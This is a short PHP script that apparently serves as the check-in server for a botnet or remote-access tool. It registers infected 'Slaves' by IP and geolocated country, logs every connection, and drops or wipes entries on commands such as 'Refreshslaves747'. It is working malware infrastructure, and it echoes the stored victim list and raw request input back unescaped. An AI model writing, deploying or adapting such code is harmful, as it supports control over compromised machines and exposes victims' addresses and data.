<?php
$fn= $_GET['online'];
$ip = $_SERVER['REMOTE_ADDR'];
$extrainfo = $_GET['info'];
$emptystring = "";

function visitor_country() {
        $ip = $_SERVER["REMOTE_ADDR"];
        if(filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        if(filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_CLIENT_IP'];
        $derp = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
               $result1=$derp ->geoplugin_countryCode;
$result2=$derp ->geoplugin_countryName;
$result = "[".$result1."] - ".$result2;
        return $result;
}

$countryname = visitor_country();
if ($extrainfo == "") { $extrainfo = "||||";}
$extrainfo = $extrainfo."|||||";
$file = file_get_contents('./Slaves.txt', False);
$write = $countryname."|".$_SERVER['REMOTE_ADDR'] . "|" .$extrainfo. "+" ;
echo $file;

echo "<br>--------------------------------------------------------------------<br>";
echo "-";
echo $extrainfo;
echo "-";
$extrainfo = ""; 
   if (strpos($file,$write) !== false) {
    echo 'found!';
}else{
$f = fopen("Slaves.txt", "a+");
    // Write text 
fwrite($f, $write); 
    fclose($f);
    echo $write;
}

    
 if ($fn == "False")
    {


$filename = "Slaves.txt";
$handle = fopen($filename, "r");
$contents = fread($handle, filesize($filename));
fclose($handle);



$WriteKill = str_replace(array($write), '', $contents);



$f = fopen("Slaves.txt", "w");
    // Write text 
fwrite($f, $WriteKill); 
    fclose($f);
}
elseif ($fn == "Refreshslaves747")
{
$fh = fopen( 'Slaves.txt', 'w' );
fclose($fh);
}

$date = date('m/d/Y h:i:s a', time());
$writeinfo = "[".$ip."] - Connected to your host at : ".$date."|-|" ;
$z = fopen("log.txt", "a+");
    // Write text 
fwrite($z, $writeinfo); 
    fclose($z);





?>